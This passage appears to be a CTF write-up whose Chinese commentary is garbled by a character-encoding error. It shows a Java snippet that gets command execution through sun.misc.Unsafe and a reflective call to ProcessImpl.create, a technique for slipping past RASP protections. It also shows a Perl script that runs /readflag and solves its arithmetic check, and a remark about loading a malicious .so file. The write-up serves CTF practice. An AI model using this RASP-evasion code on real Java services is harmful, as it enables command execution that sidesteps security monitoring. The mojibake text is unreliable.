public class aaaaa {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("sun.misc.Unsafe");
        Field field = clazz.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Class<?> processImpl = Class.forName("java.lang.ProcessImpl");
        Process process = (Process) unsafe.allocateInstance(processImpl);
        Method create = processImpl.getDeclaredMethod("create", String.class, String.class, String.class, long[].class, boolean.class);
        create.setAccessible(true);
        long[] stdHandles = new long[]{-1L, -1L, -1L};
        create.invoke(process, "whoami", null, null, stdHandles, false);

        JavaIOFileDescriptorAccess fdAccess
                = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();
        FileDescriptor stdout_fd = new FileDescriptor();
        fdAccess.setHandle(stdout_fd, stdHandles[1]);
        InputStream inputStream = new BufferedInputStream(
                new FileInputStream(stdout_fd));

        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}
```

å‡ºé¢˜äººæœ€åè‡ªå·±åŠ çš„è¿ç®—é˜²æ­¢éé¢„æœŸï¼Œcå†™çš„tnndä¸ä¼š

![image-20231118191506185](..\img\final\image-20231118191506185.png)

```java
use strict;
use IPC::Open3;

my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, '/readflag' ) or die "open3() failed!";

my $r;
$r = <CHLD_OUT>;
print "$r";
$r = <CHLD_OUT>;
print "$r";
$r = substr($r,0,-3);
$r = eval "$r";
print "$r\n";
print CHLD_IN "$r\n";
$r = <CHLD_OUT>;
print "$r";
```



```java
å›å¿†ä¸€ä¸‹å®‰æ’æœˆèµ›æ€ä¹ˆåšçš„ 
è¯»åˆ°äº†jaråŒ…ï¼Œç„¶åæˆ‘ä»¬è‡ªå·±ç”¨linuxå†™äº†ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œå¹¶ä¸”è°ƒç”¨åŠ è½½äº†è¿™ä¸ªï¼Œæœ€åå‘½ä»¤ä¼ å…¥è¿™ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é“é¢˜ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ã€‚
```



http://www.bmth666.cn/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/
